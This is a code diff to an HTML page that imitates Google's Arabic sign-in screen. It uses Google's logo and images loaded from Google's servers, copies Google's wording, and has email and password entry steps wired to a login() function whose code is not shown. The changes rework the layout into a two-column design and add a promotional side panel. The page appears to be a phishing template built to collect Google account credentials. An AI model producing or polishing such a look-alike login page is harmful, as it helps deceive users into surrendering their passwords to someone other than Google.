@@ -17,28 +17,52 @@
     }
     .container {
       background-color: white;
-      width: 450px;
-      padding: 48px 40px 36px;
+      width: 811px;
+      height: 378px;
+      padding: 40px;
       border-radius: 8px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
     }
     .logo {
-      display: block;
-      margin: 0 auto 16px auto;
       width: 75px;
       height: 24px;
+      margin-left: 20px;
     }
-    h1 {
-      font-size: 24px;
+    h2 {
+      font-size: 20px;
       font-weight: 400;
-      text-align: center;
-      margin-bottom: 8px;
+      margin: 0;
+    }
+    .content {
+      display: flex;
+      flex: 1;
+    }
+    .left-section {
+      flex: 1;
+      padding-right: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .right-section {
+      flex: 1;
+      border-left: 1px solid #dadce0;
+      padding-left: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
     }
     .subtitle {
-      font-size: 16px;
+      font-size: 14px;
       color: #5f6368;
-      text-align: center;
       margin-bottom: 24px;
     }
     .input-container {
@@ -99,24 +123,6 @@
       background-color: #1765d1;
       box-shadow: 0 1px 2px rgba(0,0,0,0.2);
     }
-    .next-button:disabled {
-      background-color: #8ab4f8;
-      cursor: default;
-    }
-    .footer {
-      margin-top: 40px;
-      font-size: 12px;
-      text-align: center;
-      color: #5f6368;
-      line-height: 1.5;
-    }
-    .language-selector {
-      position: absolute;
-      bottom: 20px;
-      left: 20px;
-      font-size: 12px;
-      color: #5f6368;
-    }
     .hidden {
       display: none;
     }
@@ -153,12 +159,6 @@
       font-size: 14px;
       font-weight: 500;
     }
-    .more-options {
-      color: #5f6368;
-      font-size: 14px;
-      margin-top: 16px;
-      cursor: pointer;
-    }
     .password-toggle {
       position: absolute;
       right: 10px;
@@ -189,63 +189,88 @@
       align-items: center;
       justify-content: center;
     }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #5f6368;
+      text-align: center;
+    }
+    .language-selector {
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo">
-    <h2>تسجيل الدخول</h2>
-    <p class="subtitle">باستخدام حسابك في Google. وسيكون هذا الحساب متاحًا لاستخدامه في تطبيقات Google الأخرى في المتصفّح.</p>
-
-    <!-- الخطوة الأولى: البريد -->
-    <div id="step-email">
-      <div class="input-container">
-        <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-        <p id="email-error" class="error-message">الرجاء إدخال بريد إلكتروني أو رقم هاتف صحيح</p>
-      </div>
-      <div class="buttons">
-        <a href="https://accounts.google.com/signup" class="create-account">إنشاء حساب</a>
-        <button id="next-button" class="next-button" onclick="goToPassword()">
-          <div class="button-content">
-            <span>التالي</span>
-          </div>
-        </button>
-      </div>
-      <a href="https://accounts.google.com/signin/recovery" class="forgot-email">نسيت البريد الإلكتروني؟</a>
+    <div class="header">
+      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo">
+      <h2>تسجيل الدخول</h2>
     </div>
-
-    <!-- الخطوة الثانية: كلمة المرور -->
-    <div id="step-password" class="hidden">
-      <div class="user-info">
-        <div class="user-avatar" id="user-avatar">م</div>
-        <div class="user-email" id="user-email-display">user@example.com</div>
-      </div>
-      <div class="input-container">
-        <div class="password-container">
-          <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-          <span class="password-toggle" onclick="togglePassword()">إظهار</span>
+    
+    <div class="content">
+      <div class="left-section">
+        <p class="subtitle">باستخدام حسابك في Google. وسيكون هذا الحساب متاحًا لاستخدامه في تطبيقات Google الأخرى في المتصفّح.</p>
+        
+        <!-- الخطوة الأولى: البريد -->
+        <div id="step-email">
+          <div class="input-container">
+            <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <p id="email-error" class="error-message">الرجاء إدخال بريد إلكتروني أو رقم هاتف صحيح</p>
+          </div>
+          <div class="buttons">
+            <a href="https://accounts.google.com/signup" class="create-account">إنشاء حساب</a>
+            <button id="next-button" class="next-button" onclick="goToPassword()">
+              <div class="button-content">
+                <span>التالي</span>
+              </div>
+            </button>
+          </div>
+          <a href="https://accounts.google.com/signin/recovery" class="forgot-email">نسيت البريد الإلكتروني؟</a>
         </div>
-        <p id="password-error" class="error-message">الرجاء إدخال كلمة المرور</p>
-      </div>
-      <a href="https://accounts.google.com/signin/recovery" class="forgot-email">نسيت كلمة المرور؟</a>
-      <div class="more-options">خيارات أخرى لتسجيل الدخول</div>
-      <div class="buttons">
-        <a href="#" class="create-account" onclick="goBackToEmail()">استخدام بريد إلكتروني آخر</a>
-        <button id="login-button" class="next-button" onclick="login()">
-          <div class="button-content">
-            <span>تسجيل الدخول</span>
+
+        <!-- الخطوة الثانية: كلمة المرور -->
+        <div id="step-password" class="hidden">
+          <div class="user-info">
+            <div class="user-avatar" id="user-avatar">م</div>
+            <div class="user-email" id="user-email-display">user@example.com</div>
           </div>
-        </button>
+          <div class="input-container">
+            <div class="password-container">
+              <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+              <span class="password-toggle" onclick="togglePassword()">إظهار</span>
+            </div>
+            <p id="password-error" class="error-message">الرجاء إدخال كلمة المرور</p>
+          </div>
+          <a href="https://accounts.google.com/signin/recovery" class="forgot-email">نسيت كلمة المرور؟</a>
+          <div class="buttons">
+            <a href="#" class="create-account" onclick="goBackToEmail()">استخدام بريد إلكتروني آخر</a>
+            <button id="login-button" class="next-button" onclick="login()">
+              <div class="button-content">
+                <span>تسجيل الدخول</span>
+              </div>
+            </button>
+          </div>
+        </div>
+      </div>
+      
+      <div class="right-section">
+        <img src="https://ssl.gstatic.com/accounts/ui/authentication/whirl_udf_48.png" alt="Google Account" style="width: 100%; max-width: 300px; margin: 0 auto;">
+        <p style="text-align: center; color: #5f6368; font-size: 14px; margin-top: 20px;">حساب واحد. كل خدمات Google.</p>
+        <p style="text-align: center; color: #5f6368; font-size: 12px;">أدخل بياناتك مرة واحدة للوصول إلى جميع خدمات Google.</p>
       </div>
     </div>
-
+    
     <div class="footer">
-      <select id="language-selector" style="border: none; background: none; color: #5f6368; font-size: 12px; margin-bottom: 8px;">
-        <option value="ar">العربية</option>
-        <option value="en">English</option>
-        <option value="fr">Français</option>
-      </select>
-      <p>لا تمتلك هذا الكمبيوتر؟ استخدِم وضع الضيف لتسجيل الدخول بشكلٍ خاص. مزيد من المعلومات حول استخدام "وضع الضيف"</p>
+      <p>لا تمتلك هذا الكمبيوتر؟ استخدِم وضع الضيف لتسجيل الدخول بشكلٍ خاص. <a href="#" style="color: #1a73e8; text-decoration: none;">مزيد من المعلومات حول استخدام "وضع الضيف"</a></p>
+      <div class="language-selector">
+        <select id="language-selector" style="border: none; background: none; color: #5f6368; font-size: 12px;">
+          <option value="ar">العربية</option>
+          <option value="en">English</option>
+          <option value="fr">Français</option>
+        </select>
+      </div>
     </div>
   </div>
 
@@ -375,4 +400,3 @@
   </script>
 </body>
 </html>
-
